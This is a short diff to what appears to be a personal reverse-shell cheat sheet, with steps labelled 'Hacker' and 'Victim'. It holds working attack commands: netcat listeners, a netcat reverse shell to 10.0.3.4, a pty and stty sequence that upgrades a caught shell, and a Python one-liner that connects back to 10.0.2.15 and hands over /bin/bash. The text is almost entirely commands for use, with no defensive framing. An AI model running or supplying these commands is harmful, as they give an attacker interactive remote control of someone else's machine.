@@ -3,3 +3,24 @@ nc -lvp 4444
 
 Victim
 nc -e /bin/sh 10.0.3.4 4444
+
+
+Victim
+python -c 'import pty;pty.spawn("/bin/bash")'
+Ctrl+Z
+
+Hacker
+stty raw -echo; fg
+export TERM=xterm
+
+
+Hacker
+nc -lvnp 9999
+
+Victim
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.15",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+
+
+
+
+
